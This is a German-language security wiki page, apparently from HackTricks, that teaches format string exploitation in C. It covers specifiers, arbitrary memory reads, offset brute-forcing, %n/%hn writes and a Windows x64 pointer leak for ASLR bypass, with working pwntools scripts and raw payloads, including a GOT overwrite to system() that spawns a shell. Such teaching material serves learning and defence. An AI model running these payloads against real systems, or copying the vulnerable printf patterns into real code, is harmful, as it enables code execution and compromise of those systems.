# Format Strings

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

In C **`printf`** ist eine Funktion, die verwendet werden kann, um einen String zu **ausgeben**. Der **erste Parameter**, den diese Funktion erwartet, ist der **Rohtext mit den Formatplatzhaltern**. Die **folgenden Parameter** sind die **Werte**, die die **Formatplatzhalter** im Rohtext **ersetzen**.

Weitere verwundbare Funktionen sind **`sprintf()`** und **`fprintf()`**.

Die Schwachstelle tritt auf, wenn ein **vom Angreifer kontrollierter Text als erstes Argument** an diese Funktion übergeben wird. Der Angreifer kann eine **spezielle Eingabe konstruieren, die die printf-Format-String-Fähigkeiten missbraucht**, um beliebige Daten an beliebigen Adressen zu **lesen** und zu **schreiben** (lesbar/schreibbar). Auf diese Weise kann beliebiger Code **ausgeführt** werden.

#### Formatplatzhalter:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%p —> Pointer
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**Beispiele:**

- Verwundbares Beispiel:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
- Normale Verwendung:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
- Mit fehlenden Argumenten:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
- fprintf verwundbar:
```c
#include <stdio.h>

int main(int argc, char *argv[]) {
char *user_input;
user_input = argv[1];
FILE *output_file = fopen("output.txt", "w");
fprintf(output_file, user_input); // The user input can include formatters!
fclose(output_file);
return 0;
}
```
### **Zugriff auf Pointers**

Das Format **`%<n>$x`**, wobei `n` eine Zahl ist, ermöglicht es, printf anzuweisen, das n-te Argument (aus dem stack) auszuwählen. Wenn du also das 4. Argument vom stack mit printf auslesen möchtest, könntest du folgendes tun:
```c
printf("%x %x %x %x")
```
und du würdest vom ersten bis zum vierten Parameter lesen.

Oder du könntest Folgendes tun:
```c
printf("%4$x")
```
und liest direkt den vierten.

Beachte, dass der Angreifer den `printf` **parameter kontrolliert, which basically means that** seine Eingabe auf dem stack liegen wird, wenn `printf` aufgerufen wird, was bedeutet, dass er spezifische address in den stack schreiben könnte.

> [!CAUTION]
> Ein Angreifer, der diese Eingabe kontrolliert, wird in der Lage sein, **beliebige address in den stack einzufügen und `printf` dazu zu bringen, auf diese zuzugreifen**. Im nächsten Abschnitt wird erklärt, wie dieses Verhalten genutzt werden kann.

## **Arbitrary Read**

Es ist möglich, den Formatter **`%n$s`** zu verwenden, damit **`printf`** die **address**, die sich an der **n position** befindet, nimmt, ihr folgt und **so druckt, als wäre sie ein string** (druckt bis eine 0x00 gefunden wird). Wenn die base address des binary **`0x8048000`** ist und wir wissen, dass die Benutzereingabe an der 4. position im stack beginnt, ist es möglich, den Anfang des binary mit:
```python
from pwn import *

p = process('./bin')

payload = b'%6$s' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
> [!CAUTION]
> Beachte, dass du die Adresse 0x8048000 nicht am Anfang der Eingabe setzen kannst, weil die Zeichenkette wegen eines 0x00-Bytes am Ende dieser Adresse beendet wird.

### Offset finden

Um den Offset zu deiner Eingabe zu finden, könntest du 4 oder 8 Bytes (`0x41414141`) senden, gefolgt von **`%1$x`**, und den Wert **erhöhen**, bis du die `A's` zurückbekommst.

<details>

<summary>Brute Force printf offset</summary>
```python
# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak

from pwn import *

# Iterate over a range of integers
for i in range(10):
# Construct a payload that includes the current integer as offset
payload = f"AAAA%{i}$x".encode()

# Start a new process of the "chall" binary
p = process("./chall")

# Send the payload to the process
p.sendline(payload)

# Read and store the output of the process
output = p.clean()

# Check if the string "41414141" (hexadecimal representation of "AAAA") is in the output
if b"41414141" in output:
# If the string is found, log the success message and break out of the loop
log.success(f"User input is at offset : {i}")
break

# Close the process
p.close()
```
</details>

### Wie nützlich

Arbitrary reads können nützlich sein, um:

- **Dump** die **binary** aus dem Speicher
- **Zugriff auf spezifische Teile des Speichers, in denen sensible** **info** gespeichert sind (wie canaries, encryption keys oder custom passwords wie in diesem [**CTF challenge**](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak#read-arbitrary-value))

## **Arbitrary Write**

Der Formatter **`%<num>$n`** **schreibt** die **Anzahl der geschriebenen Bytes** in die **angegebene Adresse**, die durch den <num>-Parameter auf dem Stack angezeigt wird. Wenn ein Angreifer so viele Zeichen mit printf schreiben kann, wie er möchte, kann er **`%<num>$n`** dazu bringen, eine beliebige Zahl in eine beliebige Adresse zu schreiben.

Glücklicherweise ist es nicht nötig, 9999 "A"s in die Eingabe zu schreiben, um die Zahl 9999 zu erreichen; stattdessen kann der Formatter **`%.<num-write>%<num>$n`** verwendet werden, um die Zahl **`<num-write>`** in die **durch die `num`-Position bezeichnete Adresse** zu schreiben.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
Beachte jedoch, dass man üblicherweise, um eine Adresse wie `0x08049724` (was eine RIESIGE Zahl ist, um sie auf einmal zu schreiben) zu schreiben, **`$hn`** anstelle von **`$n`** verwendet. Dadurch werden **nur 2 Bytes** geschrieben. Deshalb wird dieser Vorgang zweimal durchgeführt: einmal für die höheren 2B der Adresse und einmal für die niedrigeren.

Folglich erlaubt diese Schwachstelle, **beliebige Werte an beliebige Adressen zu schreiben (arbitrary write).**

In diesem Beispiel ist das Ziel, die **Adresse** einer **Funktion** in der **GOT**-Tabelle zu **überschreiben**, die später aufgerufen wird. Obwohl dies auch andere arbitrary write → exec Techniken ausnutzen könnte:


{{#ref}}
../arbitrary-write-2-exec/
{{#endref}}

Wir werden eine **Funktion** überschreiben, die ihre **Argumente** vom **Benutzer** erhält, und sie auf die **`system`** **Funktion** zeigen lassen.\
Wie erwähnt, sind zum Schreiben der Adresse normalerweise 2 Schritte nötig: Zuerst schreibt man 2 Bytes der Adresse und dann die anderen 2. Dazu wird **`$hn`** verwendet.

- **HOB** bezeichnet die 2 höheren Bytes der Adresse
- **LOB** bezeichnet die 2 niedrigeren Bytes der Adresse

Dann, aufgrund der Funktionsweise von format string, muss man **zuerst den kleineren** von \[HOB, LOB] schreiben und danach den anderen.

If HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

If HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 NºParam_dir_HOB LOB_shell-HOB_shell NºParam_dir_LOB
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
### Pwntools Vorlage

Du findest eine **Vorlage**, um einen Exploit für diese Art von Schwachstelle vorzubereiten in:


{{#ref}}
format-strings-template.md
{{#endref}}

Oder dieses grundlegende Beispiel von [**here**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite):
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## Format Strings to BOF

Es ist möglich, die Schreibaktionen einer format string vulnerability auszunutzen, um **in Adressen des stack zu schreiben** und eine **buffer overflow**-Art von Schwachstelle auszunutzen.


## Windows x64: Format-string leak to bypass ASLR (no varargs)

Unter Windows x64 werden die ersten vier Integer-/Pointer-Parameter in Registern übergeben: RCX, RDX, R8, R9. An vielen fehlerhaften Aufrufstellen wird die vom Angreifer kontrollierte Zeichenkette als Format-Argument verwendet, aber keine varargs übergeben, zum Beispiel:
```c
// keyData is fully controlled by the client
// _snprintf(dst, len, fmt, ...)
_snprintf(keyStringBuffer, 0xff2, (char*)keyData);
```
Because no varargs are passed, any conversion like "%p", "%x", "%s" will cause the CRT to read the next variadic argument from the appropriate register. With the Microsoft x64 calling convention the first such read for "%p" comes from R9. Whatever transient value is in R9 at the call-site will be printed. In practice this often leaks a stable in-module pointer (e.g., a pointer to a local/global object previously placed in R9 by surrounding code or a callee-saved value), which can be used to recover the module base and defeat ASLR.

Praktischer Workflow:

- Injiziere ein harmloses Format wie "%p " ganz am Anfang des attacker-controlled string, sodass die erste Conversion ausgeführt wird bevor irgendeine Filterung.
- Fange den leaked pointer ein, identifiziere den statischen Offset dieses Objekts im Modul (durch einmaliges reversing mit symbols oder einer lokalen Kopie), und rekonstruiere die image base als `leak - known_offset`.
- Wiederverwende diese base, um absolute Adressen für ROP gadgets und IAT entries remote zu berechnen.

Beispiel (abbreviated python):
```python
from pwn import remote

# Send an input that the vulnerable code will pass as the "format"
fmt = b"%p " + b"-AAAAA-BBB-CCCC-0252-"  # leading %p leaks R9
io = remote(HOST, 4141)
# ... drive protocol to reach the vulnerable snprintf ...
leaked = int(io.recvline().split()[2], 16)   # e.g. 0x7ff6693d0660
base   = leaked - 0x20660                     # module base = leak - offset
print(hex(leaked), hex(base))
```
Hinweise:
- Der genaue Offset, der subtrahiert werden muss, wird einmal während des lokalen Reversings ermittelt und dann wiederverwendet (dieselbe binary/version).
- If "%p" doesn’t print a valid pointer on the first try, try other specifiers ("%llx", "%s") or multiple conversions ("%p %p %p") to sample other argument registers/stack.
- Dieses Muster ist spezifisch für die Windows x64 calling convention und printf-family implementations, die nonexistent varargs aus Registern holen, wenn der Format-String sie anfordert.

Diese Technik ist extrem nützlich, um ROP auf Windows-Services zu bootstrapen, die mit ASLR kompiliert sind und keine offensichtlichen memory disclosure primitives besitzen.

## Other Examples & References

- [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
- [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
- [https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak)
- [https://guyinatuxedo.github.io/10-fmt_strings/pico18_echo/index.html](https://guyinatuxedo.github.io/10-fmt_strings/pico18_echo/index.html)
- 32 bit, no relro, no canary, nx, no pie, basic use of format strings to leak the flag from the stack (no need to alter the execution flow)
- [https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html)
- 32 bit, relro, no canary, nx, no pie, format string to overwrite the address `fflush` with the win function (ret2win)
- [https://guyinatuxedo.github.io/10-fmt_strings/tw16_greeting/index.html](https://guyinatuxedo.github.io/10-fmt_strings/tw16_greeting/index.html)
- 32 bit, relro, no canary, nx, no pie, format string to write an address inside main in `.fini_array` (so the flow loops back 1 more time) and write the address to `system` in the GOT table pointing to `strlen`. When the flow goes back to main, `strlen` is executed with user input and pointing to `system`, it will execute the passed commands.


## References

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [x64 calling convention (MSVC)](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention)

{{#include ../../banners/hacktricks-training.md}}
